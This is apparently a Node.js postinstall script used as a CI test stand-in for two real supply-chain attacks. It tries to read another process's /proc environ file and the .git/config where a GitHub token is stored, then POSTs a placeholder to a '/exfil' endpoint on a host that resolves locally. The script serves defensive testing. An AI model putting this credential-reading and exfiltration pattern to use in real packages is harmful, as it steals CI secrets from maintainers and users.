// Live-CI stand-in for two real attacks. Sends a placeholder, never the token.
const fs = require('fs');
const path = require('path');
const http = require('http');
const { spawn } = require('child_process');

// 1. tj-actions pattern: read another process's environment (the real payload
// used sudo on Runner.Worker's memory; same rule, no root needed here).
const victim = spawn('sleep', ['5']);
try {
  fs.readFileSync(`/proc/${victim.pid}/environ`);
  console.log(`[postinstall] read /proc/${victim.pid}/environ`);
} catch (e) {
  console.log(`[postinstall] could not read /proc/${victim.pid}/environ: ${e.message}`);
}
victim.kill();

// 2. GITHUB_TOKEN theft: actions/checkout persists the token in .git/config.
const gitConfig = path.join(process.env.GITHUB_WORKSPACE || process.cwd(), '.git', 'config');
try {
  fs.readFileSync(gitConfig);
  console.log(`[postinstall] read ${gitConfig}`);
} catch (e) {
  console.log(`[postinstall] could not read ${gitConfig}: ${e.message}`);
}

// 3. Egress after the .git/config read, through a real DNS lookup:
// 127.0.0.1.nip.io is public DNS that answers 127.0.0.1, so it hits the local listener.
const req = http.request({ hostname: '127.0.0.1.nip.io', port: 8088, path: '/exfil', method: 'POST' }, (res) => {
  console.log(`[postinstall] response: ${res.statusCode}`);
  process.exit(0);
});
req.on('error', (err) => {
  console.log(`[postinstall] connect attempted: ${err.message}`);
  process.exit(0);
});
req.end('placeholder');
